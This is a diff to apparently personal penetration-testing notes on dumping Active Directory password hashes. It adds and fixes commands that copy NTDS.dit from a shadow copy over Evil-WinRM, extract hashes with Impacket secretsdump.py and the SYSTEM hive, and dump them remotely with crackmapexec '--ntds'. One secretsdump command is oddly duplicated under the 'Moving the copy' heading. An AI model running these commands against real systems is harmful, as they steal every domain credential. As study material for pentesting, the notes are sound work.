@@ -224,7 +224,27 @@ We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.co
 *Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 ```
 
+{% hint style="warning" %}
+It is important to note that we need to import the system bootkey which resides in the hklm/system hive using the methods in [here](local-windows-password-attacks.md#sam-database).
+
+After importing both to our machine we use this command:
+
+```bash
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system system.save LOCAL
+```
+
+Then &#x20;
+
+```bash
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system system.save -ntds NTDS.dit LOCAL 
+```
+{% endhint %}
+
 ### Moving the copy
+
+```bash
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system system.save LOCAL
+```
 
 Look in [here](local-windows-password-attacks.md#transfer-the-backup-files-to-our-attacking-machine) for the first method.
 
@@ -233,7 +253,7 @@ Look in [here](local-windows-password-attacks.md#transfer-the-backup-files-to-ou
 Another faster method is using cme, which does all of the above with just one command.
 
 ```bash
-$ crackmapexec smb <target-ip> -u <username> -p <password>--ntds
+$ crackmapexec smb <target-ip> -u <username> -p <password> --ntds
 ```
 
 ### Cracking the hash
